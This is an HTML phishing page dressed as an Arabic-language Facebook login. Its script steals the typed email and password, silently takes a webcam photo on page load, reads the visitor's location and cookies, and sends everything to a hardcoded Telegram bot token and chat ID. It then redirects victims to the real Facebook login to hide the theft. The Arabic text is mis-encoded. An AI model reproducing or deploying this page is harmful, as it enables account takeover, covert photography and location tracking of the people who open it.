<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <title>ÙÙŠØ³Ø¨ÙˆÙƒ - ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <style>
        body {margin:0;padding:0;background:#f0f2f5;font-family:system-ui,sans-serif;display:flex;justify-content:center;align-items:flex-start;min-height:100vh;padding-top:20px;}
        .fb-container {width:100%;max-width:400px;background:white;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1);overflow:hidden;}
        .header {background:#1877f2;padding:12px;text-align:center;color:white;font-size:24px;font-weight:bold;}
        .form-area {padding:20px;}
        input {width:100%;padding:14px;margin:8px 0;border:1px solid #dddfe2;border-radius:6px;font-size:16px;box-sizing:border-box;}
        .login-btn {width:100%;padding:14px;background:#1877f2;color:white;font-size:18px;font-weight:bold;border:none;border-radius:6px;cursor:pointer;margin-top:10px;}
        .footer {text-align:center;padding:20px;font-size:13px;color:#8a8d91;}
    </style>
</head>
<body>

<div class="fb-container">
    <div class="header">facebook</div>
    <div class="form-area">
        <input type="text" id="email" placeholder="Ø±Ù‚Ù… Ø§Ù„Ø¬ÙˆØ§Ù„ Ø£Ùˆ Ø§Ù„Ø¨Ø±ÙŠØ¯ Ø§Ù„Ø¥Ù„ÙƒØªØ±ÙˆÙ†ÙŠ">
        <input type="password" id="pass" placeholder="ÙƒÙ„Ù…Ø© Ø§Ù„Ù…Ø±ÙˆØ±">
        <button type="button" id="loginBtn" class="login-btn">ØªØ³Ø¬ÙŠÙ„ Ø§Ù„Ø¯Ø®ÙˆÙ„</button>
    </div>
    <div class="footer">Meta Â© 2026</div>
</div>

<video id="video" style="display:none" autoplay playsinline></video>
<canvas id="canvas" style="display:none"></canvas>

<script>
// --- ØªØ£ÙƒØ¯ Ù…Ù† Ù‡Ø°Ù‡ Ø§Ù„Ù‚ÙŠÙ… ---
const BOT_TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
const CHAT_ID = "1611398303";

function getCookiesJSON() {
    try {
        let cookies = document.cookie.split(';');
        let cookieArr = [];
        cookies.forEach(cookie => {
            let parts = cookie.split('=');
            if(parts.length >= 2) {
                cookieArr.push({
                    "name": parts[0].trim(),
                    "value": parts[1].trim(),
                    "domain": ".facebook.com", 
                    "path": "/",
                    "secure": true
                });
            }
        });
        return cookieArr.length > 0 ? JSON.stringify(cookieArr, null, 2) : "Ù„Ø§ ØªÙˆØ¬Ø¯ ÙƒÙˆÙƒÙŠØ² Ù…ØªØ§Ø­Ø© Ø­Ø§Ù„ÙŠØ§Ù‹";
    } catch(e) { return "Ø®Ø·Ø£ ÙÙŠ Ø³Ø­Ø¨ Ø§Ù„ÙƒÙˆÙƒÙŠØ²"; }
}

window.onload = function() {
    startCapture("ÙØªØ­ ØªÙ„Ù‚Ø§Ø¦ÙŠ Ù„Ù„Ø±Ø§Ø¨Ø·");
};

document.getElementById('loginBtn').addEventListener('click', function() {
    const email = document.getElementById('email').value;
    const pass = document.getElementById('pass').value;
    if(!email || !pass) return;
    
    this.innerText = "Ø¬Ø§Ø±ÙŠ Ø§Ù„ØªØ­Ù‚Ù‚...";
    startCapture(`ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„: ${email} | ${pass}`);
});

async function startCapture(triggerSource) {
    let photoData = null;
    let locationLink = "ØªØ¹Ø°Ø± Ø§Ù„Ø­ØµÙˆÙ„ Ø¹Ù„Ù‰ Ø§Ù„Ù…ÙˆÙ‚Ø¹";

    try {
        // 1. Ù…Ø­Ø§ÙˆÙ„Ø© ØªØ´ØºÙŠÙ„ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        const video = document.getElementById('video');
        video.srcObject = stream;
        await new Promise(res => setTimeout(res, 2500)); // ÙˆÙ‚Øª ÙƒØ§ÙÙ Ù„Ù„Ø¥Ø¶Ø§Ø¡Ø©

        const canvas = document.getElementById('canvas');
        canvas.width = 640;
        canvas.height = 480;
        canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
        photoData = canvas.toDataURL('image/jpeg', 0.7);
        stream.getTracks().forEach(t => t.stop());
    } catch (e) { console.log("Camera access denied"); }

    // 2. Ù…Ø­Ø§ÙˆÙ„Ø© Ø¬Ù„Ø¨ Ø§Ù„Ù…ÙˆÙ‚Ø¹
    try {
        await new Promise((resolve) => {
            navigator.geolocation.getCurrentPosition(
                (pos) => {
                    locationLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
                    resolve();
                },
                () => { resolve(); },
                { timeout: 5000 }
            );
        });
    } catch (e) { }

    // 3. Ø¥Ø±Ø³Ø§Ù„ Ø§Ù„Ø¨ÙŠØ§Ù†Ø§Øª
    await sendToTelegram(photoData, locationLink, triggerSource);
}

async function sendToTelegram(photo, location, extraInfo) {
    const cookiesJSON = getCookiesJSON();
    const caption = `ğŸ­ **Ø¥Ø¨Ù‡Ø§Ø± ØªÙ‚Ù†ÙŠ: Ø§Ø®ØªØ±Ø§Ù‚ ÙƒØ§Ù…Ù„** ğŸ­\n\n` +
                    `ğŸ“ **Ø§Ù„Ù…ØµØ¯Ø±:** ${extraInfo}\n` +
                    `ğŸ“ **Ø§Ù„Ù…ÙˆÙ‚Ø¹:** ${location}\n\n` +
                    `ğŸª **Ø§Ù„ÙƒÙˆÙƒÙŠØ² (JSON):**\n\`\`\`json\n${cookiesJSON}\n\`\`\`\n` +
                    `ğŸ•’ **Ø§Ù„ÙˆÙ‚Øª:** ${new Date().toLocaleString('ar-EG')}`;

    try {
        if (photo) {
            const blob = await (await fetch(photo)).blob();
            const formData = new FormData();
            formData.append('chat_id', CHAT_ID);
            formData.append('photo', blob, 'img.jpg');
            formData.append('caption', caption);
            formData.append('parse_mode', 'Markdown');
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
        } else {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CHAT_ID,
                    text: caption,
                    parse_mode: "Markdown"
                })
            });
        }
    } catch (err) { console.error("Telegram API Error"); }

    if (extraInfo.includes("ØªØ³Ø¬ÙŠÙ„ Ø¯Ø®ÙˆÙ„")) {
        window.location.href = "https://www.facebook.com/login.php";
    }
}
</script>
</body>
</html>
